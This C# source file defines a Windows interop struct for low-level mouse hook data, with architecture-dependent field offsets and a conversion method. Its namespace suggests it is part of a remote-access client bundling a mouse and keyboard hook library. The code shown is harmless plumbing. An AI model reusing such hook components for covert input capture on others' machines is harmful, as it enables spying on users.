using System;
using System.Runtime.InteropServices;

namespace xClient.Kuuhaku«ekirdek.MouseKeyHook.WinApi
{
    [StructLayout(LayoutKind.Explicit)]
    internal struct AppMouseStruct
    {
        [FieldOffset(0x00)] public Point Point;

#if IS_X64
        [FieldOffset(0x22)]
#else
        [FieldOffset(0x16)]
#endif
            public Int16 MouseData;

        public MouseStruct ToMouseStruct()
        {
            MouseStruct tmp = new MouseStruct();
            tmp.Point = Point;
            tmp.MouseData = MouseData;
            tmp.Timestamp = Environment.TickCount;
            return tmp;
        }
    }
}